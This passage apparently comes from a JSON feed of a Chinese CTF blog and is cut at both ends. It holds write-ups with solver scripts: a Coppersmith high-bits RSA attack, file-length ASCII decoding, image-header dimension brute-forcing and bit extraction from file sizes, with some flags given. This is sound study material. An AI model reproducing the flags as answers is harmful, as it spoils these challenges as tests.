data-num=\"30\"></td><td><pre>output:</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>3216831712236484919804716473942409526434016529181790011140718891645020999952523287950679312500771653918738887189899203815116997399422419456666136527466294225647700744715569996552708989626431982330367733125015062070399091789218760399060531383324158096784030850407432126491091299460659042468401054516052600467997</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>36691536769373164488130311421517753226870999465362409179446664596323017708216823951466573340643687346264018616414288774195411449434676147898363218552160256</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>[127358722814661886628344839530462144916373, 1569005233424413714924223862235964763229, 15953826944429720811716497916877126603181, 22667750449179799152236917772041505492557, 7259500259309895932387328648172298540473, 1216723397014858024629084355784570444737, 5803969258694833349275399163572927306963, 2847514965593473340352693322675908465517, 55965603506094486681210827499140188004581, 3758825246939161175629619499256754206153, 9865309015695677187200661453839724337633, 1985189335531812324455545509044214546841)]</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>[17514122934988110165886587218707943859589, 828023569353871016099054873610645592579, 3834965867062595899595546144451189629655, 5083410101797762407471893731877939884166, 6199590917760184276466050254032811548454, 208337506454727094683323122852921121527, 5210709327454808237359999225611588134922, 239093795148407379152016295908193630983, 29793049900271876372064873251244672365333, 1641943491807405218384351799880631607416, 1685895805013787734204509484411577153108, 1511298522529374764380482522275435302730)]</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>'''</span></pre></td></tr></table></figure><p>高位攻擊恢復 p+crt<br />\n 給大家推薦幾個高位攻擊回復 p 的 blog<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xvc3RuZXJ2L2FydGljbGUvZGV0YWlscy8xMDYwMDkxMjc=\">https://blog.csdn.net/lostnerv/article/details/106009127</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9lNDA3YmUzOWEyMmI=\">https://www.jianshu.com/p/e407be39a22b</span></p>\n<p>上脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> sympy <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#sage</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>#高位p</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e = 65537</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>n = 3216831712236484919804716473942409526434016529181790011140718891645020999952523287950679312500771653918738887189899203815116997399422419456666136527466294225647700744715569996552708989626431982330367733125015062070399091789218760399060531383324158096784030850407432126491091299460659042468401054516052600467997</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pbar = 36691536769373164488130311421517753226870999465362409179446664596323017708216823951466573340643687346264018616414289061014410434943387973225734363385787789</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>kbits = 128</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>print(\"upper %d bits (of %d bits) is given\" % (pbar.nbits()-kbits, pbar.nbits()))</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>PR.&lt;x> = PolynomialRing(Zmod(n))</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>f = x + pbar</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>x0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root &lt; 2^kbits with factor >= n^0.4</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p = x0 + pbar</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>print(\"p:\", p)</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>#crt求c</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>crt([17514122934988110165886587218707943859589, 828023569353871016099054873610645592579, 3834965867062595899595546144451189629655, 5083410101797762407471893731877939884166, 6199590917760184276466050254032811548454, 208337506454727094683323122852921121527, 5210709327454808237359999225611588134922, 239093795148407379152016295908193630983, 29793049900271876372064873251244672365333, 1641943491807405218384351799880631607416, 1685895805013787734204509484411577153108, 1511298522529374764380482522275435302730],[127358722814661886628344839530462144916373, 1569005233424413714924223862235964763229, 15953826944429720811716497916877126603181, 22667750449179799152236917772041505492557, 7259500259309895932387328648172298540473, 1216723397014858024629084355784570444737, 5803969258694833349275399163572927306963, 2847514965593473340352693322675908465517, 55965603506094486681210827499140188004581, 3758825246939161175629619499256754206153, 9865309015695677187200661453839724337633, 1985189335531812324455545509044214546841])</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">1077233712188252453962763215420078090384941182152999954278038468778840824135535740613334922110769959923025621861732351020130627648669752220543773285487384058164614139587422610914396593954389899763791857297268825420364912075493471765126196898848111738107851858382589951634394904231520912326280908229934082041817</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">3216831712236484919804716473942409526434016529181790011140718891645020999952523287950679312500771653918738887189899203815116997399422419456666136527466294225647700744715569996552708989626431982330367733125015062070399091789218760399060531383324158096784030850407432126491091299460659042468401054516052600467997</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">36691536769373164488130311421517753226870999465362409179446664596323017708216823951466573340643687346264018616414289061014410434943387973225734363385787789</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>d <span class=\"token operator\">=</span> invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>flag{5bb5e0a9d48f44a3770253875f263810}<br />\n<img data-src=\"/img/CRYPTO/gaowei1.jpg\" alt=\"avatar\" /></p>\n",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/BUGKUmisc/",
            "url": "https://zephyr-cyber.github.io.git/BUGKUmisc/",
            "title": "bugku-MISC",
            "date_published": "2021-12-01T01:05:47.215Z",
            "content_html": "<h1 id=\"where_is_flag\"><a class=\"anchor\" href=\"#where_is_flag\">#</a> where_is_flag</h1>\n<p>下载附件得到 10 个 txt 文件，用 010 打开发现里面全是 00 截断符号<br />\n<img data-src=\"/img/MISC/whereisflag1.jpg\" alt=\"avatar\" /></p>\n<p>看字节大小，用 py 脚本把每个文件的字节长度跑出来</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> n <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    name <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'.txt'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p na0d0ngdaka1=\"\"><img data-src=\"/img/MISC/whereisflag2.jpg\" alt=\"avatar\" /><br />\n 跑出来的字节长度应该是十进制的 ascii 码，尝试对它进行分割，然后跑出来得到 bugku</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> n <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    name <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'.txt'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">'98 117 103 107 117 123 110 97 48 100 48 110 103 100 97 107 97 49 125'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>flag<span class=\"token operator\">=</span>flag<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/MISC/whereisflag3.jpg\" alt=\"avatar\" /></p>\n",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/accumulate/",
            "url": "https://zephyr-cyber.github.io.git/accumulate/",
            "title": "accumulate",
            "date_published": "2021-12-01T01:05:47.212Z",
            "content_html": "<h3 id=\"gif文件修改大小\"><a class=\"anchor\" href=\"#gif文件修改大小\">#</a> gif 文件修改大小</h3>\n<p><img data-src=\"/img/accumulate/1.png\" alt=\"avatar\" /></p>\n<p>gif 修改大小 FF 为 255</p>\n<p><img data-src=\"/img/accumulate/2.png\" alt=\"avatar\" /></p>\n<p><img data-src=\"/img/accumulate/3.png\" alt=\"avatar\" /></p>\n<p>一共修改两处</p>\n<h3 id=\"bmp修改大小\"><a class=\"anchor\" href=\"#bmp修改大小\">#</a> bmp 修改大小</h3>\n<p>可以看见</p>\n<p><img data-src=\"/img/accumulate/bmp.png\" alt=\"avatar\" /></p>\n<p>4 个字节代表宽和高 84030000，F3000000</p>\n<p>贴爆破 bmp 宽度的脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> struct</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> zlib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./.bmp'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>width <span class=\"token operator\">=</span> c<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>height <span class=\"token operator\">=</span> c<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">:</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 爆破 bmp 宽度</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">900</span><span class=\"token punctuation\">,</span><span class=\"token number\">1100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    f1 <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'.bmp'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\"># print(struct.pack('>i',i)[::-1])</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    img <span class=\"token operator\">=</span> c<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'>i'</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>c<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    f1<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    f1<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>可以看到 900 到 1100 的宽度的图片，慢慢找适合的宽度。</p>\n<h3 id=\"png修改大小\"><a class=\"anchor\" href=\"#png修改大小\">#</a> png 修改大小</h3>\n<p><img data-src=\"/img/accumulate/png.png\" alt=\"avatar\" /></p>\n<p>这边修改大小</p>\n<p>看到 crc</p>\n<p>可以用 crc 爆破</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> struct</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>crcbp <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"misc26.png\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">#打开图片</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        data <span class=\"token operator\">=</span> crcbp<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> \\</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'>i'</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'>i'</span><span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>crcbp<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">:</span><span class=\"token number\">29</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        crc32 <span class=\"token operator\">=</span> binascii<span class=\"token punctuation\">.</span>crc32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xffffffff</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>crc32 <span class=\"token operator\">==</span> <span class=\"token number\">0xEC9CCBC6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    <span class=\"token comment\">#图片当前 CRC</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hex:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>result<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token number\">900</span> <span class=\"token number\">606</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token builtin\">hex</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0x384</span> <span class=\"token number\">0x25e</span></pre></td></tr></table></figure><p>标准大小是 900*606</p>\n<h3 id=\"jpg修改大小\"><a class=\"anchor\" href=\"#jpg修改大小\">#</a> jpg 修改大小</h3>\n<p><img data-src=\"/img/accumulate/jpg.png\" alt=\"avatar\" /></p>\n<p>96 改成 FF 最大就可以了</p>\n",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/%E6%AF%94%E8%B5%9Bmisc/",
            "url": "https://zephyr-cyber.github.io.git/%E6%AF%94%E8%B5%9Bmisc/",
            "title": "比赛MISC",
            "date_published": "2021-12-01T01:05:47.202Z",
            "content_html": "<p>2021/10/21 更新了 MISC3 - 眼神要好使，得到的 flag 中的内容请 md5 后上交 - blasting 的附件</p>\n<h1 id=\"祥云杯2021-misc-鸣雏恋\"><a class=\"anchor\" href=\"#祥云杯2021-misc-鸣雏恋\">#</a> 祥云杯 2021-MISC - 鸣雏恋</h1>\n<p>算是学习脚本了吧<br />\n遍历目录脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>files <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>filePath<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#遍历文件夹里的图片</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token builtin\">file</span> <span class=\"token keyword\">in</span> files<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\"># 把文件路径和文件名结合起来</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        file_d <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>filePath<span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\"># 判断该文件是单个文件还是文件夹</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isdir<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 如果是文件夹则递归调用 scanDir () 函数</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            scanDir<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            file_stats <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>stat<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>file_stats<span class=\"token punctuation\">.</span>st_size<span class=\"token operator\">==</span><span class=\"token number\">262</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>遍历不一定是按顺序的，还是以用图片的数字编号为准</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">129488</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        file_d <span class=\"token operator\">=</span> <span class=\"token string\">r'C:\\\\Users\\\\pengzixuan\\\\Desktop\\\\out\\\\'</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'.png'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        file_stats <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>stat<span class=\"token punctuation\">(</span>file_d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file_stats<span class=\"token punctuation\">.</span>st_size <span class=\"token operator\">==</span> <span class=\"token number\">262</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    flag<span class=\"token operator\">=</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    data<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        str1 <span class=\"token operator\">=</span> flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        data<span class=\"token operator\">+=</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>str1<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    data1<span class=\"token operator\">=</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\">#去掉前几位</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    bs <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token 